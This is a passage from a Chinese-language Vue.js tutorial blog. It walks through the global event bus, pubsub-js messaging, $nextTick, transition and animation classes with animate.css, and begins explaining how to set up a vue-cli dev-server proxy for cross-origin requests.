<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">    ...</span><br><span class="line">	beforeCreate() &#123;</span><br><span class="line">    	Vue.prototype.$bus = this // 安装全局事件总线，$bus就是当前应用的`vm`</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用事件总线</p>
<ul>
<li><p>接收数据：<code>A</code>组件想接收数据，则在<code>A</code>组件中给<code>$bus</code>绑定自定义事件，事件的回调留在<code>A</code>组件自身</p>
<p><code>A</code>组件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="comment">// 事件的回调</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>合适的时机，提供数据：<code>this.$bus.$emit(&#39;xxx&#39;, data)</code></p>
</li>
</ul>
</li>
<li><p>最好在<code>beforeDestroy</code>钩子中，用<code>$off</code>去解绑当前组件所用到的事件</p>
<p><code>A</code>组件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(xxx, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 销毁前解绑用到的自定义事件</span></span><br><span class="line"><span class="title function_">beforeDestroy</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$off(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用全局事件总线，改写<code>toDoList</code>案例</p>
</li>
</ul>
<h2 id="3-14-消息订阅与发布"><a href="#3-14-消息订阅与发布" class="headerlink" title="3.14.消息订阅与发布"></a>3.14.消息订阅与发布</h2><p>消息订阅与发布</p>
<ul>
<li>订阅消息：消息名</li>
<li>发布消息：消息内容</li>
</ul>
<p>下载安装：<code>npm i pubsub-js -D</code></p>
<p>在<code>A</code>组件中订阅消息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;School/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import School from &#x27;./views/School.vue&#x27;;</span><br><span class="line">  import pubsub from &#x27;pubsub-js&#x27;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#x27;App&#x27;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      School</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted() &#123;</span><br><span class="line">      this.pubid = pubsub.subscribe(&#x27;hello&#x27;, (mesName, data) =&gt; &#123;</span><br><span class="line">        console.log(&#x27;有人发布了hello消息，hello消息的回调执行了&#x27;, mesName, data, this)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    beforeDestroy() &#123;</span><br><span class="line">      pubsub.unsubscribe(this.pubid)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在<code>B</code>组件中发布消息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    Hello</span><br><span class="line">    &lt;button @click=&quot;publishMes&quot;&gt;发布消息&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import pubsub from &#x27;pubsub-js&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;School&#x27;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    publishMes() &#123;</span><br><span class="line">      pubsub.publish(&#x27;hello&#x27;, 666)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>小结：消息订阅与发布</p>
<ul>
<li><p>一种组件间通信的方式</p>
</li>
<li><p>使用步骤</p>
<ul>
<li><p>安装<code>pubsub</code>：<code>npm i pubsub-js -D</code></p>
</li>
<li><p>引入：<code>import pubsub from &#39;pubsub-js&#39;</code></p>
</li>
<li><p>接收数据：<code>A</code>组件想接收数据，则在<code>A</code>组件中订阅消息，订阅的回调留在<code>A</code>组件本身</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">mesName, data</span>) &#123;</span><br><span class="line">        <span class="comment">// 默认是有两个参数，一个是消息名称，一个是消息内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 需要在组件实例上，添加pid属性，销毁该条消息的时候要用到</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>提供数据：<code>pubsub.publish(&#39;xxx&#39;, data)</code></p>
<ul>
<li>最好在<code>beforeDestroy</code>钩子中，使用<code>pubsub.unsubscribe(pid)</code><span style="color:red">取消订阅</span></li>
</ul>
</li>
</ul>
</li>
<li><p>消息订阅模式，在<code>Vue</code>中用的不多，因为其原理和事件总线类似</p>
</li>
<li><p>可以使用消息订阅模式，改写<code>toDoList</code>案例的删除功能</p>
</li>
<li><p>新增<code>toDoList</code>编辑功能</p>
</li>
</ul>
<p><code>this.$nextTick</code>，可以指定一个回调，在下一次<code>dom</code>节点更新之后再执行</p>
<p>什么时候用：当数据改变后，要基于更新后的新<code>dom</code>进行某些操作时，要在<code>$nextTick</code>所指定的回调函数中执行</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$nextTick(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">inputTitle</span>.<span class="title function_">focus</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="3-15-动画与过渡"><a href="#3-15-动画与过渡" class="headerlink" title="3.15.动画与过渡"></a>3.15.动画与过渡</h2><h3 id="3-15-1-动画效果"><a href="#3-15-1-动画效果" class="headerlink" title="3.15.1.动画效果"></a>3.15.1.动画效果</h3><p>原生实现动画效果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;isShow = !isShow&quot;&gt;click&lt;/button&gt;</span><br><span class="line">    &lt;h2 v-show=&quot;isShow&quot; class=&quot;go&quot;&gt;你好呀&lt;/h2&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#x27;Test&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        isShow: true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  h2 &#123;</span><br><span class="line">    background-color: orange;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .come &#123;</span><br><span class="line">    animation: come 1s linear;</span><br><span class="line">  &#125;</span><br><span class="line">  .go &#123;</span><br><span class="line">    animation: come 1s linear reverse;</span><br><span class="line">  &#125;</span><br><span class="line">  @keyframes come &#123;</span><br><span class="line">    from &#123;</span><br><span class="line">      transform: translateX(-100%);</span><br><span class="line">    &#125;</span><br><span class="line">    to &#123;</span><br><span class="line">      transform: translateX(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>后续逻辑是不断的切换<code>come</code>和<code>go</code>的类名</p>
<p><code>Vue</code>就封装了上述的操作</p>
<ul>
<li>使用<code>transistion</code>包裹想要发生动画的元素<ul>
<li>这样<code>Vue</code>就会在合适的时候，加上固定的动画（类名）</li>
</ul>
</li>
<li><code>v-enter-active</code><ul>
<li>进入的整个过程，添加的样式类名</li>
</ul>
</li>
<li><code>v-leave-active</code><ul>
<li>离开的整个过程，添加的样式类名</li>
</ul>
</li>
<li><code>Vue</code>不和动画进行对话，只和样式的类名进行对话</li>
<li>注意：<code>transition</code>只针对被<code>v-show</code>或<code>v-if</code>控制的元素</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;isShow = !isShow&quot;&gt;click&lt;/button&gt;</span><br><span class="line">    &lt;transition&gt;</span><br><span class="line">      &lt;h2 v-show=&quot;isShow&quot; class=&quot;go&quot;&gt;你好呀&lt;/h2&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#x27;Test&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        isShow: true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  h2 &#123;</span><br><span class="line">    background-color: orange;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .v-enter-active &#123;</span><br><span class="line">    animation: come 1s linear;</span><br><span class="line">  &#125;</span><br><span class="line">  .v-leave-active &#123;</span><br><span class="line">    animation: come 1s linear reverse;</span><br><span class="line">  &#125;</span><br><span class="line">  @keyframes come &#123;</span><br><span class="line">    from &#123;</span><br><span class="line">      transform: translateX(-100%);</span><br><span class="line">    &#125;</span><br><span class="line">    to &#123;</span><br><span class="line">      transform: translateX(0);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>每个过渡还可以命名，命名后样式的类名要对应上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;hello&quot;&gt;</span><br><span class="line">  &lt;h2 v-show=&quot;isShow&quot; class=&quot;go&quot;&gt;你好呀&lt;/h2&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hello-enter-active</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: come <span class="number">1s</span> linear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.hello-leave-active</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: come <span class="number">1s</span> linear reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果希望一开始就播放动画，给<code>transition</code>添加一个<code>appear</code>属性，有两种写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;hello&quot; :appear=&quot;true&quot;&gt;</span><br><span class="line">  &lt;h2 v-show=&quot;isShow&quot; class=&quot;go&quot;&gt;你好呀&lt;/h2&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<p>或者是简写形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;hello&quot; appear&gt;</span><br><span class="line">  &lt;h2 v-show=&quot;isShow&quot; class=&quot;go&quot;&gt;你好呀&lt;/h2&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>值得注意的是，<code>transition</code>并不会渲染成真实<code>dom</code></p>
</li>
</ul>
<h3 id="3-15-2-过渡效果"><a href="#3-15-2-过渡效果" class="headerlink" title="3.15.2.过渡效果"></a>3.15.2.过渡效果</h3><p>元素出现的过程中，<code>Vue</code>除了添加<code>v-enter-active</code>，还添加了<code>v-enter</code>和<code>v-enter-to</code>这两个类名</p>
<ul>
<li><code>v-enter</code>：进入的起点</li>
<li><code>v-enter-to</code>：进入的终点</li>
</ul>
<p>相当于封装了原生的<code>transition</code>的写法</p>
<p>同理，元素离开的过程中，<code>Vue</code>还会添加<code>v-leave</code>和<code>v-leave-to</code>这两个类名，分别表示离开的起点、离开的终点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;isShow = !isShow&quot;&gt;click&lt;/button&gt;</span><br><span class="line">    &lt;transition name=&quot;hello&quot; appear&gt;</span><br><span class="line">      &lt;h2 v-show=&quot;isShow&quot; class=&quot;go&quot;&gt;你好呀&lt;/h2&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#x27;Test&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        isShow: true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  h2 &#123;</span><br><span class="line">    background-color: orange;</span><br><span class="line">    transition: 0.5s linear;</span><br><span class="line">  &#125;</span><br><span class="line">  .hello-enter, .hello-leave-to &#123;</span><br><span class="line">    transform: translateX(-100%);</span><br><span class="line">  &#125;</span><br><span class="line">  .hello-enter-to, .hello-leave &#123;</span><br><span class="line">    transform: translateX(0);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>为了不破坏原来元素中，写的样式，我们将<code>transition: 0.5s linear;</code>抽出来</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  <span class="selector-tag">h2</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: orange;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.hello-enter-active</span>, <span class="selector-class">.hello-leave-active</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">0.5s</span> linear; <span class="comment">/* 元素在进入及隐藏的整个过程，都会有这个属性值 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.hello-enter</span>, <span class="selector-class">.hello-leave-to</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">100%</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.hello-enter-to</span>, <span class="selector-class">.hello-leave</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>上面的写法就相当于写在了变化的元素身上</p>
<h3 id="3-15-3-多个元素的过渡"><a href="#3-15-3-多个元素的过渡" class="headerlink" title="3.15.3.多个元素的过渡"></a>3.15.3.多个元素的过渡</h3><p>使用<code>&lt;transition-group&gt;</code>标签包裹多个元素，同时要指定<code>key</code>，其他的不变</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition-group&gt;</span><br><span class="line">	&lt;div key=&quot;1&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div key=&quot;2&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div key=&quot;3&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/transition-group&gt;</span><br></pre></td></tr></table></figure>

<p><code>key</code>值可以借助<code>v-for</code>来指定或手动指定</p>
<h3 id="3-15-4-第三方动画库"><a href="#3-15-4-第三方动画库" class="headerlink" title="3.15.4.第三方动画库"></a>3.15.4.第三方动画库</h3><p><code>animate.css</code>：<a target="_blank" rel="noopener" href="https://animate.style/">Animate.css | A cross-browser library of CSS animations.</a></p>
<p>安装：<code>npm i animate.css -D</code></p>
<p>组件或入口文件中引入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;animate.css&#x27;</span></span><br></pre></td></tr></table></figure>

<p>初始化配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;animate__animated animate__bounce&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<p>动画配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition</span><br><span class="line">            appear</span><br><span class="line">            name=&quot;animate__animated animate__bounce&quot;</span><br><span class="line">            enter-active-class=&quot;animate__fadeIn&quot;</span><br><span class="line">            leave-active-class=&quot;animate__fadeOut&quot;</span><br><span class="line">            &gt;</span><br><span class="line">    &lt;div v-show=&quot;isShow&quot; class=&quot;animate__fast&quot;&gt;</span><br><span class="line">        </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<p>即可实现动画效果</p>
<p>如果要控制时间，给被<code>v-show</code>控制的元素添加类名即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class name	Default speed time</span><br><span class="line">animate__slow	2s</span><br><span class="line">animate__slower	3s</span><br><span class="line">animate__fast	800ms</span><br><span class="line">animate__faster	500ms</span><br></pre></td></tr></table></figure>



<h3 id="3-15-5-小结：Vue封装的过渡与动画"><a href="#3-15-5-小结：Vue封装的过渡与动画" class="headerlink" title="3.15.5.小结：Vue封装的过渡与动画"></a>3.15.5.小结：<code>Vue</code>封装的过渡与动画</h3><ul>
<li><p>作用：在插入、更新或移除<code>dom</code>时，在合适的时机给元素添加类名</p>
</li>
<li><p>图示：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220531200443590.png" alt="image-20220531200443590"></p>
</li>
<li><p>写法：</p>
<ul>
<li><p>准备好样式：</p>
<ul>
<li>元素进入的样式<ul>
<li><code>v-enter</code>：进入的起点</li>
<li><code>v-enter-active</code>：进入的整个过程</li>
<li><code>v-enter-to</code>：进入的终点</li>
</ul>
</li>
<li>元素离开的样式<ul>
<li><code>v-leave</code>：离开的起点</li>
<li><code>v-leave-active</code>：离开的整个过程</li>
<li><code>v-leave-to</code>：离开的终点</li>
</ul>
</li>
</ul>
</li>
<li><p>使用<code>&lt;transition&gt;</code>包裹要过渡的元素，并配置<code>name</code>属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition&gt;</span><br><span class="line">	&lt;h1 v-show=&quot;isShow&quot;&gt;</span><br><span class="line">        你好</span><br><span class="line">    &lt;/h1&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>备注：若有多个元素需要过渡，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code></p>
</li>
<li><p>使用<code>&lt;transition&gt;</code>完善<code>toDoList</code>案例</p>
</li>
</ul>
</li>
</ul>
<h1 id="4-Vue中的ajax"><a href="#4-Vue中的ajax" class="headerlink" title="4.Vue中的ajax"></a>4.<code>Vue</code>中的<code>ajax</code></h1><h2 id="4-1-vue-cli中配置代理"><a href="#4-1-vue-cli中配置代理" class="headerlink" title="4.1.vue-cli中配置代理"></a>4.1.<code>vue-cli</code>中配置代理</h2><p>使用<code>ajax</code>技术，发送请求可能会存在跨域问题</p>
<p>本机的浏览器是8080，直接向服务器5000请求数据是不行的，可以通过本机的服务器8080这个代理服务器发请求</p>
<p>服务器和服务器之间，发送请求是不存在跨域问题的，跨域问题只存在于浏览器端</p>
<p>那么怎么开启代理服务器呢？</p>
<ul>
<li><p>通过<code>nginx</code>配置代理服务器</p>
</li>
<li><p>通过<code>vue-cli</code>的配置项</p>
<ul>
<li><p>方式一：</p>
<p><code>vue.config.js</code></p>
<p>新增配置项<code>devServer</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: <span class="string">&quot;http://localhost:5000&quot;</span> <span class="comment">//配置成最终要请求的服务器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>填写该配置项后，<code>vue-cli</code>会生成一个8080的服务器，并且开发的<code>public</code>目录，对应着该服务器的资源目录，<code>ajax</code>的请求路径，要修改成代理服务的</p>
<p>优点：</p>
<ul>
<li>配置简单，请求资源直接发给前端即可</li>
</ul>
<p>存在的问题：</p>
<ul>
<li>不能配置多个代理服务器，不能灵活的控制请求是否走代理</li>
<li>如果请求路径和<code>public</code>目录资源存在重复，则会返回代理服务的的资源，请求不会转发</li>
</ul>
</li>
<li><p>方式二：</p>
<p><code>vue.config.js</code></p>
